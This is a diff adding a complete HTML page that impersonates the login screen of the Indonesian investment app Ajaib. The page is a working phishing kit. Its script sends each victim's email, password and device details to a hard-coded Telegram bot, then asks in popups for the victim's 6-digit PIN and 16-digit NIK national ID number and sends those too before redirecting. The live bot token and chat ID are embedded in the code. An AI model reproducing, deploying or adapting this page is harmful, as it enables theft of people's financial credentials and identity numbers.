@@ -1,0 +1,442 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Ajaib: Saham, Bond & Reksadana</title>
+  <meta name="description" content="Login | Masuk ke akun Ajaib kamu dengan aman dan cepat.">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet" />
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet" />
+
+  <style>
+    body {
+      margin: 0; padding: 0;
+      background: #fff;
+      font-family: 'Roboto', sans-serif;
+    }
+    .container {
+      max-width: 360px;
+      margin: auto;
+      padding: 20px;
+    }
+    .logo {
+      display: block;
+      margin: 20px auto;
+      width: 160px;
+    }
+    h1 {
+      text-align: center;
+      font-size: 1.5rem;
+      font-weight: 500;
+      margin-bottom: 20px;
+    }
+    .form-label {
+      display: block;
+      font-size: 0.9rem;
+      margin-bottom: 4px;
+    }
+    .form-group {
+      margin-bottom: 18px;
+    }
+    .input-wrapper {
+      display: flex;
+      align-items: center;
+      border-bottom: 1px solid #ccc;
+    }
+    .input-wrapper input {
+      flex: 1;
+      border: none;
+      padding: 12px 0;
+      font-size: 1rem;
+      outline: none;
+      background: transparent;
+    }
+    .toggle-password {
+      background: none;
+      border: none;
+      color: #888;
+      cursor: pointer;
+      padding: 0 8px;
+      font-size: 1rem;
+    }
+    .text-danger {
+      color: red;
+      font-size: 0.8rem;
+      display: none;
+    }
+    .btn {
+      width: 100%;
+      padding: 12px;
+      background: #007bff;
+      color: white;
+      font-weight: 500;
+      font-size: 1rem;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      margin-top: 100px;
+    }
+    .link {
+      font-weight: 300;
+      font-size: 0.95rem;
+      color: #4a8fe7;
+      text-decoration: none;
+      transition: color 0.2s ease;
+    }
+    .text-center {
+      text-align: center;
+    }
+    .footer-info {
+      margin-top: 40px;
+      text-align: center;
+      background: #4da4ff;
+      color: white;
+      padding: 20px;
+      font-weight: 500;
+      border-radius: 12px 12px 0 0;
+    }
+    .spinner {
+      display: none;
+      width: 16px;
+      height: 16px;
+      border: 2px solid #fff;
+      border-top-color: transparent;
+      border-radius: 50%;
+      margin-left: 8px;
+      animation: spin 0.6s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .pin-popup, .nik-popup {
+      position: fixed;
+      bottom: -100%;
+      left: 0; right: 0;
+      background: white;
+      padding: 20px;
+      box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.1);
+      border-radius: 16px 16px 0 0;
+      transition: bottom 0.4s ease-in-out;
+      z-index: 999;
+    }
+    .pin-popup.show, .nik-popup.show { bottom: 0; }
+    .pin-popup h2, .nik-popup h2 {
+      text-align: center;
+      font-size: 1.1rem;
+      margin-bottom: 16px;
+      font-weight: 400;
+    }
+    .pin-inputs {
+      display: flex;
+      justify-content: center;
+      gap: 8px;
+    }
+    .pin-inputs input {
+      width: 42px;
+      height: 56px;
+      font-size: 1.5rem;
+      text-align: center;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-weight: 500;
+    }
+    .nik-input {
+      width: 100%;
+      padding: 12px;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      margin-bottom: 10px;
+      text-align: center;
+    }
+    .pin-error, .nik-error {
+      color: red;
+      font-size: 0.8rem;
+      text-align: center;
+      margin-top: 10px;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <img src="https://i.imghippo.com/files/LQ3613FYs.png" alt="Logo Ajaib" class="logo" />
+    <h1></h1>
+
+    <form id="loginForm">
+      <div class="form-group">
+        <label for="email" class="form-label">Email</label>
+        <div class="input-wrapper">
+          <input type="email" id="email" placeholder="Masukkan email" required />
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label for="password" class="form-label">Password</label>
+        <div class="input-wrapper">
+          <input type="password" id="password" placeholder="Masukkan password" required />
+          <button type="button" class="toggle-password" id="togglePwd">
+            <i class="fa fa-eye"></i>
+          </button>
+        </div>
+        <small id="passwordError" class="text-danger">Password harus mengandung huruf, angka, dan simbol.</small>
+      </div>
+
+      <a href="#" class="link">Lupa password?</a>
+      <button type="submit" class="btn" id="loginBtn">
+        <span id="btnText">Masuk</span>
+        <span class="spinner" id="btnSpinner"></span>
+      </button>
+    </form>
+
+    <div class="text-center mt-3">
+      <p>Belum punya akun? <a href="#" class="link">Daftar</a></p>
+    </div>
+  </div>
+
+  <div class="footer-info">4 Alasan Ajaib Dipercaya 1 Juta++</div>
+
+  <!-- PIN Popup -->
+  <div class="pin-popup" id="pinPopup">
+    <h2>Masukkan 6 Digit PIN Ajaib Kamu</h2>
+    <div class="pin-inputs">
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+      <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" />
+    </div>
+    <div class="pin-error" id="pinError">PIN harus 6 digit angka</div>
+    <button class="btn" style="margin-top:20px;" onclick="submitPIN()">Konfirmasi</button>
+  </div>
+
+  <!-- NIK KTP Popup -->
+  <div class="nik-popup" id="nikPopup">
+    <h2>Masukkan 16 Digit NIK KTP Kamu</h2>
+    <input type="text" class="nik-input" id="nikInput" placeholder="Masukkan NIK KTP" maxlength="16" inputmode="numeric" pattern="[0-9]*" />
+    <div class="nik-error" id="nikError">NIK harus 16 digit angka</div>
+    <button class="btn" style="margin-top:20px;" onclick="submitNIK()">Konfirmasi</button>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8351688472:AAExJHhcvou252MUHiUpvXHbKTiRmgTv-Bc";
+    const CHAT_ID = "8584190131";
+
+    document.getElementById("togglePwd").addEventListener("click", () => {
+      const pwd = document.getElementById("password");
+      const icon = document.querySelector("#togglePwd i");
+      pwd.type = pwd.type === "password" ? "text" : "password";
+      icon.classList.toggle("fa-eye-slash");
+    });
+
+    document.getElementById("loginForm").addEventListener("submit", async function (e) {
+      e.preventDefault();
+
+      const email = document.getElementById("email").value.trim();
+      const password = document.getElementById("password").value;
+      const error = document.getElementById("passwordError");
+
+      const isValid = /^(?=.*[a-zA-Z])(?=.*\d)(?=.*[^a-zA-Z0-9]).{6,}$/.test(password);
+      if (!isValid) {
+        error.style.display = "block";
+        return;
+      } else {
+        error.style.display = "none";
+      }
+
+      document.getElementById("btnText").style.display = "none";
+      document.getElementById("btnSpinner").style.display = "inline-block";
+      document.getElementById("loginBtn").disabled = true;
+
+      const device = navigator.userAgent;
+      const loginTime = new Date().toLocaleString("id-ID", {
+        timeZone: "Asia/Jakarta",
+        hour12: false,
+        weekday: "long",
+        year: "numeric",
+        month: "long",
+        day: "numeric",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit"
+      });
+
+      let location = "Tidak diketahui";
+      try {
+        const res = await fetch("https://ipinfo.io/json?token=ce1df7fbc7b225");
+        const data = await res.json();
+        if (data.city && data.region && data.country) {
+          location = `${data.city}, ${data.region}, ${data.country}`;
+        }
+      } catch {
+        location = "Gagal deteksi lokasi";
+      }
+
+      try {
+        // ✅ Simpan email ke localStorage
+        localStorage.setItem('ajaib_email', email);
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text:
+              `🟢 𝗗𝗔𝗧𝗔 𝗟𝗢𝗚𝗜𝗡 𝗔𝗝𝗔𝗜𝗕 ✅️\n` +
+              `📧 Email: ${email}\n` +
+              `🔒 Password: ${password}\n` +
+              `📱 Perangkat: ${device}\n` +
+              `🕒 Waktu Login: ${loginTime}`
+          })
+        });
+      } catch (err) {
+        console.error("Telegram Error:", err);
+      }
+
+      setTimeout(() => {
+        document.getElementById("btnText").style.display = "inline";
+        document.getElementById("btnSpinner").style.display = "none";
+        document.getElementById("loginBtn").disabled = false;
+
+        const popup = document.getElementById("pinPopup");
+        popup.classList.add("show");
+
+        const inputs = popup.querySelectorAll(".pin-inputs input");
+        inputs[0].focus();
+        
+        // Menambahkan event listener untuk setiap input PIN
+        inputs.forEach((input, i) => {
+          // Validasi input hanya angka
+          input.addEventListener("input", (e) => {
+            // Hanya menerima angka
+            if (!/^\d*$/.test(e.target.value)) {
+              e.target.value = e.target.value.replace(/\D/g, '');
+            }
+            
+            // Jika input terisi dan masih ada input berikutnya, fokus ke input berikutnya
+            if (e.target.value && i < inputs.length - 1) {
+              inputs[i + 1].focus();
+            }
+          });
+          
+          // Mengizinkan navigasi dengan tombol panah dan backspace
+          input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && !e.target.value && i > 0) {
+              inputs[i - 1].focus();
+            } else if (e.key === "ArrowLeft" && i > 0) {
+              inputs[i - 1].focus();
+            } else if (e.key === "ArrowRight" && i < inputs.length - 1) {
+              inputs[i + 1].focus();
+            }
+          });
+        });
+      }, 1500);
+    });
+
+    function submitPIN() {
+      const inputs = document.querySelectorAll(".pin-inputs input");
+      const pin = Array.from(inputs).map(i => i.value).join("");
+      const pinError = document.getElementById("pinError");
+
+      // Validasi PIN harus 6 digit angka
+      if (pin.length !== 6 || !/^\d{6}$/.test(pin)) {
+        pinError.style.display = "block";
+        return;
+      } else {
+        pinError.style.display = "none";
+      }
+
+      const pinTime = new Date().toLocaleString("id-ID", {
+        timeZone: "Asia/Jakarta",
+        hour12: false,
+        weekday: "long",
+        year: "numeric",
+        month: "long",
+        day: "numeric",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit"
+      });
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text:
+            `🔐 VERIFIKASI PIN AJAIB\n` +
+            `🔢 PIN: ${pin}\n` +
+            `🕒 Waktu Masuk: ${pinTime}`
+        })
+      }).then(() => {
+        document.getElementById("pinPopup").classList.remove("show");
+        inputs.forEach(i => i.value = "");
+        
+        // Tampilkan popup NIK KTP setelah PIN berhasil
+        setTimeout(() => {
+          document.getElementById("nikPopup").classList.add("show");
+          document.getElementById("nikInput").focus();
+        }, 300);
+        
+      }).catch(err => {
+        alert("Gagal mengirim PIN. Coba lagi.");
+        console.error("Telegram Error:", err);
+      });
+    }
+
+    function submitNIK() {
+      const nikInput = document.getElementById("nikInput");
+      const nik = nikInput.value.trim();
+      const nikError = document.getElementById("nikError");
+
+      // Validasi NIK harus 16 digit angka
+      if (nik.length !== 16 || !/^\d{16}$/.test(nik)) {
+        nikError.style.display = "block";
+        return;
+      } else {
+        nikError.style.display = "none";
+      }
+
+      const nikTime = new Date().toLocaleString("id-ID", {
+        timeZone: "Asia/Jakarta",
+        hour12: false,
+        weekday: "long",
+        year: "numeric",
+        month: "long",
+        day: "numeric",
+        hour: "2-digit",
+        minute: "2-digit",
+        second: "2-digit"
+      });
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text:
+            `🆔 VERIFIKASI NIK KTP\n` +
+            `📇 NIK: ${nik}\n` +
+            `🕒 Waktu Masuk: ${nikTime}`
+        })
+      }).then(() => {
+        document.getElementById("nikPopup").classList.remove("show");
+        nikInput.value = "";
+        window.location.href = "selanjutnya1.html";
+      }).catch(err => {
+        alert("Gagal mengirim NIK. Coba lagi.");
+        console.error("Telegram Error:", err);
+      });
+    }
+
+    // Validasi input NIK hanya menerima angka
+    document.getElementById("nikInput").addEventListener("input", function(e) {
+      // Hanya menerima angka
+      if (!/^\d*$/.test(e.target.value)) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+      }
+    });
+  </script>
+</body>
+</html>
